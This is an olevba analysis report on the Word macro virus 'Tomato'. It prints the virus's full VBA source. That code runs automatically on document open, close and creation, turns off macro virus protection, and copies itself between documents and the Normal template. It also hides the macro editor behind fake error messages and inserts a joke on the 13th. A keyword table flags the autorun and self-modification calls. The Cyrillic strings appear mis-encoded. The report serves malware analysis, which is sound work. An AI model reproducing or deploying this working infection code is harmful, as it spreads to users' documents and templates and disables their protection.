olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tomato-2841124604e27fc5d5604d4a9db61824ec60997b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Tomato-2841124604e27fc5d5604d4a9db61824ec60997b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
''Thus_001'
'---------------------------------------------------------------------
'Tomato
StartPos = 53
On Error GoTo Exit1
VirusProtection = False
SaveNormalPrompt = True
Set ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Set nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
If Day(Now) = 13 Then
    Words.Item(1).InsertAfter ("Ńčä˙ň äâĺ ďîěčäîđęč â őîëîäčëüíîęĺ, ě¸đçíóň, ňóň îäí˙ ăîâîđčň: 'äŕ çŕäîëáŕëŕńü ˙ óćĺ ě¸đçíóňü!', äđóăŕ˙: 'ŕ-ŕ-ŕ ăîâîđ˙ůŕ˙ ďîěčäîđŕ!?!'")
End If
If Mid(ad.Lines(4, 1), 2, 6) <> "Tomato" Then
    If ad.CountOfLines > 0 Then ad.DeleteLines 1, ad.CountOfLines
    s = nt.Lines(1, nt.CountOfLines)
    ad.InsertLines 1, s
    ad.ReplaceLine 45, "Sub ViewVBCode1()"
    ad.ReplaceLine 49, "Sub ToolsMacro1()"
    virus_col = Val(Mid(nt.Lines(StartPos, 1), 9, 4)) + 1
    nt.ReplaceLine StartPos, Mid(nt.Lines(StartPos, 1), 1, 8) + Str(virus_col)
    If ActiveDocument.Saved = False Then ActiveDocument.Save
End If
If Mid(nt.Lines(4, 1), 2, 6) <> "Tomato" Then
    If nt.CountOfLines > 0 Then nt.DeleteLines 1, nt.CountOfLines
    s = ad.Lines(1, ad.CountOfLines)
    nt.InsertLines 1, s
    nt.ReplaceLine 45, "Sub ViewVBCode()"
    nt.ReplaceLine 49, "Sub ToolsMacro()"
    virus_col = Val(Mid(nt.Lines(StartPos, 1), 9, 4)) + 1
    nt.ReplaceLine StartPos, Mid(nt.Lines(StartPos, 1), 1, 8) + Str(virus_col)
    If NormalTemplate.Saved = False Then NormalTemplate.Save
End If
Exit1:
End Sub

Private Sub Document_New()
    Document_Close
End Sub

Private Sub Document_Open()
    Document_Close
End Sub
 
Sub ViewVBCode()
    MsgBox "Îřčáęŕ číčöčŕëčçŕöč MS Visual Basic", vbCritical
End Sub

Sub ToolsMacro()
    MsgBox "Îřčáęŕ číčöčŕëčçŕöč MS Visual Basic", vbCritical
End Sub

' Ęîďč˙ą 158
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

